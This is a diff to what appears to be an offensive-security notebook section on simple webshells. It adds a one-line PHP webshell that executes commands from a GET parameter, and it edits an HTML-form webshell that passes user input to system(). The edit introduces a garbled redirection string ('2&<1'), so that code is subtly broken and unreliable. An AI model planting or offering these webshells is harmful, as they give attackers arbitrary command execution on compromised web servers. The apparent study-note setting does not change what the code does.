@@ -20,17 +20,25 @@ Navigate to the **Command and Control** section related to [[05 - Spawn Callback
 
 ### 2.1 - Simple Webshells
 
+- Tiny webshell
+
+```php
+<?=`$_GET[0]`?>
+```
+
+- Basic webshell with HTML input form
+
 ```php
 <html>
     <body>
-        <form method="get" name="<?php echo basename($_SERVER["PHP_SELF"]); ?>">
+        <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
             <input type="text" name="cmd" autofocus id="cmd" size="80">
             <input type="submit" value="Execute">
         </form>
         <pre>
             <?php
             if(isset($_GET["cmd"])) {
-                system($_GET["cmd"]);            
+                echo system($_GET["cmd"] . " 2&<1");          
             }
             ?>
         </pre>
